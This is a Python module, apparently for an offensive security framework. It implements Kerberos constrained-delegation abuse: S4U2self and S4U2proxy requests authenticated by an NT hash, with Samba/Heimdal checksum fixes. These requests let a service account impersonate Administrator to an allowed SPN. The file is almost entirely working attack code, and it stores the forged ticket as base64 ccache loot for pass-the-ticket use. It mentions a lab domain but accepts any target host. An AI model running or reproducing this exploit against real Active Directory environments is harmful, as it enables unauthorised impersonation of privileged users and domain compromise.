"""S4U2self + S4U2proxy: weaponize constrained delegation with protocol transition.

The setup (find it with auxiliary/enum/delegation): an account holding both
TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION and msDS-AllowedToDelegateTo can
impersonate ANY user to the listed services, no interaction with the
victim at all. Two Kerberos extensions chain into that:

  1. S4U2self (protocol transition): the service presents its own TGT and
     asks for a service ticket TO ITSELF *as the victim*. The KDC trusts
     the T2A4D flag and hands it over.
  2. S4U2proxy (constrained delegation): the service trades that ticket
     (as an additional-ticket) for a ticket to a service on its allowed
     list — e.g. HTTP/api.forge.local. The reply is a ticket naming the
     victim (Administrator) against the backend: impersonation complete.

The delegation enum finds the config; this module is the payoff. Auth is by
NT hash (NTHASH directly, or derived from PASSWORD) — hash auth makes
impacket request an RC4 session key, which the RFC 4757 checksum profile
below is defined for.

COMPAT NOTES (validated against the Samba AD lab, keep in sync with
kerberoast.py's vendored request):
  - Samba's Heimdal KDC rejects authenticators without the cksum field —
    same fix as kerberoast.py.
  - The PA-FOR-USER cksum is NOT a plain HMAC: it's RFC 4757
    KERB_CHECKSUM_HMAC_MD5 with usage 17 (Ksign = HMAC(K, "signaturekey\\0"),
    then MD5(LE32(17) || blob), then HMAC(Ksign, that)). Heimdal's
    mssfu.c verifies exactly this and answers KRB_AP_ERR_BAD_INTEGRITY for
    the plain form.
  - additional-tickets must be in the req-body BEFORE the authenticator
    cksum is computed — the cksum covers the final encoding.
  - the S4U2self ticket must be re-encoded through impacket's types.Ticket:
    a component lifted out of a decoded TGS-REP keeps its outer tag and
    encodes as garbage DER (the KDC just drops the connection).
"""

import datetime
import random
import struct

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from Cryptodome.Hash import HMAC, MD4, MD5
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    from impacket.krb5 import constants
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import (
        AP_REQ,
        AS_REP,
        TGS_REP,
        TGS_REQ,
        Authenticator,
        PA_FOR_USER_ENC,
        PA_PAC_OPTIONS,
        Ticket as Asn1Ticket,
        seq_set,
        seq_set_iter,
    )
    from impacket.krb5.crypto import Cksumtype, make_checksum
    from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
    from impacket.krb5.types import KerberosTime, Principal, Ticket
except ImportError:
    constants = None  # console gates run() on requirements

RC4 = 23  # constants.EncryptionTypes.rc4_hmac
EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"


def _auth_cksum_type(enctype):
    return {23: Cksumtype.HMAC_MD5, 17: Cksumtype.SHA1_AES128,
            18: Cksumtype.SHA1_AES256}[enctype]


def _strip_explicit_tag(data):
    """Remove a leading [n] EXPLICIT tag wrapper from a DER value."""
    if not data or not 0xA0 <= data[0] <= 0xBF:
        return data
    if data[1] & 0x80:
        return data[2 + (data[1] & 0x7F):]
    return data[2:]


def nt_hash_hex(password):
    """NT hash of a password, hex — hash auth forces an RC4 session key."""
    h = MD4.new()
    h.update(password.encode("utf-16-le"))
    return h.hexdigest()


def valid_hex(text, length=32):
    """True when text is `length` hex characters (an NT hash)."""
    if len(text) != length:
        return False
    try:
        bytes.fromhex(text)
        return True
    except ValueError:
        return False


def s4u_checksum_data(impersonate, domain, name_type=1):
    """PA-FOR-USER checksum input: LE32(name-type) || user || realm || auth.
    Heimdal's _krb5_s4u2self_to_checksumdata concatenates multi-component
    names with no separator; single-component NT_PRINCIPAL (1) covers the
    impersonation case."""
    return (struct.pack("<I", name_type) + impersonate.encode()
            + domain.upper().encode() + b"Kerberos")


def pa_for_user_cksum(session_key_contents, blob):
    """RFC 4757 KERB_CHECKSUM_HMAC_MD5 with usage 17 — NOT a plain HMAC.
    Samba's mssfu.c computes exactly this over s4u_checksum_data and
    rejects anything else with KRB_AP_ERR_BAD_INTEGRITY."""
    ksign = HMAC.new(session_key_contents, b"signaturekey\0", MD5).digest()
    tmp = MD5.new(struct.pack("<I", 17) + blob).digest()
    return HMAC.new(ksign, tmp, MD5).digest()


def _base_tgs_req(spn, domain, extra_kdc_options=()):
    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    req_body = seq_set(tgs_req, "req-body")
    flags = [constants.KDCOptions.forwardable.value,
             constants.KDCOptions.canonicalize.value] + list(extra_kdc_options)
    req_body["kdc-options"] = constants.encodeFlags(flags)
    seq_set(req_body, "sname", spn.components_to_asn1)
    req_body["realm"] = domain.upper()
    now = datetime.datetime.now(datetime.timezone.utc)
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ))
    return tgs_req, req_body, now


def _attach_ap_req(tgs_req, req_body, tgt, cipher, session_key, now):
    """padata[0] = PA-TGS-REQ, with the authenticator cksum Heimdal needs.
    MUST be called after the req-body is final — the cksum covers it."""
    decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(decoded_tgt["ticket"])
    req_body_bytes = _strip_explicit_tag(encoder.encode(req_body))

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = decoded_tgt["crealm"].asOctets()
    client_name = Principal()
    client_name.from_asn1(decoded_tgt, "crealm", "cname")
    seq_set(authenticator, "cname", client_name.components_to_asn1)

    def _fill_cksum(component):
        component["cksumtype"] = _auth_cksum_type(cipher.enctype)
        component["checksum"] = make_checksum(component["cksumtype"],
                                              session_key, 6, req_body_bytes)
        return component

    seq_set(authenticator, "cksum", _fill_cksum)
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", ticket.to_asn1)
    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = cipher.encrypt(session_key, 7,
                                                       encoder.encode(authenticator),
                                                       None)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)


def s4u2self(service, impersonate, tgt, cipher, session_key, domain, kdc_host):
    """A ticket to `service` itself, issued for `impersonate`."""
    spn = Principal(service, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgs_req, req_body, now = _base_tgs_req(spn, domain)
    _attach_ap_req(tgs_req, req_body, tgt, cipher, session_key, now)

    client_name = Principal(impersonate,
                            type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    pa_for_user = PA_FOR_USER_ENC()
    seq_set(pa_for_user, "userName", client_name.components_to_asn1)
    pa_for_user["userRealm"] = domain.upper()
    pa_for_user["auth-package"] = "Kerberos"
    pa_for_user["cksum"] = noValue
    pa_for_user["cksum"]["cksumtype"] = int(constants.ChecksumTypes.hmac_md5.value)
    pa_for_user["cksum"]["checksum"] = pa_for_user_cksum(
        session_key.contents, s4u_checksum_data(impersonate, domain))

    tgs_req["padata"][1] = noValue
    tgs_req["padata"][1]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
    tgs_req["padata"][1]["padata-value"] = encoder.encode(pa_for_user)
    return sendReceive(encoder.encode(tgs_req), domain.upper(), kdc_host)


def s4u2proxy(target_spn, s4u_ticket, tgt, cipher, session_key, domain, kdc_host):
    """Trade the S4U2self ticket for one to target_spn (the allowed list).
    PA-PAC-OPTIONS with the RBCD bit is REQUIRED: without it Samba's KDC
    never evaluates the target's msDS-AllowedToActOnBehalfOfOtherIdentity
    (mssfu.c gate) and only checks classic constrained delegation."""
    spn = Principal(target_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs_req, req_body, now = _base_tgs_req(
        spn, domain, [constants.KDCOptions.cname_in_addl_tkt.value])
    # additional tickets BEFORE the AP-REQ: the authenticator cksum covers
    # the final req-body encoding
    wrapped = Ticket()
    wrapped.from_asn1(s4u_ticket)
    seq_set_iter(req_body, "additional-tickets",
                 (wrapped.to_asn1(Asn1Ticket()),))
    _attach_ap_req(tgs_req, req_body, tgt, cipher, session_key, now)
    # the RBCD gate: tells the KDC to check the target's RBCD SD, not
    # only the classic msDS-AllowedToDelegateTo list
    pac_options = PA_PAC_OPTIONS()
    pac_options["flags"] = constants.encodeFlags(
        [constants.PAPacOptions.resource_based_constrained_delegation.value])
    tgs_req["padata"][1] = noValue
    tgs_req["padata"][1]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value)
    tgs_req["padata"][1]["padata-value"] = encoder.encode(pac_options)
    return sendReceive(encoder.encode(tgs_req), domain.upper(), kdc_host)


class S4U(AuxiliaryModule):
    name = "S4U (constrained delegation abuse)"
    description = """
        S4U2self + S4U2proxy against an account with protocol-transition
        constrained delegation (find them with auxiliary/enum/delegation).
        Impersonates IMPERSONATE (default Administrator) to SPN — one of
        the account's msDS-AllowedToDelegateTo entries — with no victim
        interaction. The final ticket lands in loot as base64 CCACHE
        (feed it to auxiliary/attack/pass_the_ticket or KRB5CCNAME
        tools). Auth by
        NTHASH or PASSWORD (hashed to NT, which also forces an RC4 session
        key the checksum profile needs).
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller / KDC"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Service account holding the delegation "
                                               "(e.g. web_svc)"))
        self.options.add(OptString("PASSWORD", default="",
                                   description="Service account password "
                                               "(hashed to NT internally)"))
        self.options.add(OptString("NTHASH", default="",
                                   description="Service account NT hash, hex "
                                               "(overrides PASSWORD)"))
        self.options.add(OptString("IMPERSONATE", default="Administrator",
                                   description="User to impersonate"))
        self.options.add(OptString("SPN", required=True,
                                   description="Target SPN from the account's "
                                               "msDS-AllowedToDelegateTo, e.g. "
                                               "HTTP/api.forge.local"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        service = str(self.get_option("USERNAME") or "")
        nthash = str(self.get_option("NTHASH") or "").strip()
        password = str(self.get_option("PASSWORD") or "")
        impersonate = str(self.get_option("IMPERSONATE"))
        target_spn = str(self.get_option("SPN"))

        if not nthash:
            if not password:
                self.print_error("set PASSWORD or NTHASH")
                return
            nthash = nt_hash_hex(password)
        if not valid_hex(nthash):
            self.print_error("NTHASH must be 32 hex chars")
            return

        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._abuse(host, domain, service, nthash, impersonate, target_spn)

    def _abuse(self, host, domain, service, nthash, impersonate, target_spn):
        store = getattr(self.framework, "store", None)
        principal = Principal(service,
                              type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            tgt, cipher, _, session_key = getKerberosTGT(
                principal, "", domain, EMPTY_LM, nthash, kdcHost=host)
        except Exception as e:
            self.print_error(f"{host}: TGT failed for {service} - {e}")
            return
        self.print_status(f"{host}: TGT acquired as {service} "
                          f"(session etype {cipher.enctype})")
        if store is not None:
            store.add_cred(host, "kerberos", service, nthash, source="s4u")

        self.print_status(f"{host}: S4U2self — {service} asks for a ticket "
                          f"as {impersonate}")
        try:
            rep = s4u2self(service, impersonate, tgt, cipher, session_key,
                           domain, host)
        except Exception as e:
            self.print_error(f"{host}: S4U2self denied - {e} "
                             f"(is {service} trusted for protocol transition?)")
            return
        tgs_rep = decoder.decode(rep, asn1Spec=TGS_REP())[0]
        cname = "/".join(str(c) for c in tgs_rep["cname"]["name-string"])
        self.print_good(f"{host}: S4U2self ticket issued to {cname}")
        self.print_debug(f"{host}: s4u2self tgs-rep: {rep.hex()}")

        self.print_status(f"{host}: S4U2proxy — trading it for {target_spn}")
        try:
            rep2 = s4u2proxy(target_spn, tgs_rep["ticket"], tgt, cipher,
                             session_key, domain, host)
        except Exception as e:
            self.print_error(f"{host}: S4U2proxy denied - {e} "
                             f"(is {target_spn} on {service}'s allowed list?)")
            return
        tgs_rep2 = decoder.decode(rep2, asn1Spec=TGS_REP())[0]
        cname2 = "/".join(str(c) for c in tgs_rep2["cname"]["name-string"])
        sname2 = "/".join(str(c) for c in tgs_rep2["ticket"]["sname"]["name-string"])
        self.print_good(f"{host}: {cname2} -> {sname2}: delegation abused, "
                        f"impersonation complete")
        if store is not None:
            import base64
            # ccache (ticket + session keys), the format pass_the_ticket
            # and KRB5CCNAME tools consume
            ccache = CCache()
            ccache.fromTGS(rep2, session_key, session_key)
            store.add_loot("ticket", f"s4u {cname2} -> {sname2} @ {domain}",
                           base64.b64encode(ccache.getData()).decode(),
                           address=host)
            self.print_status("Ticket saved as loot (base64 ccache)")
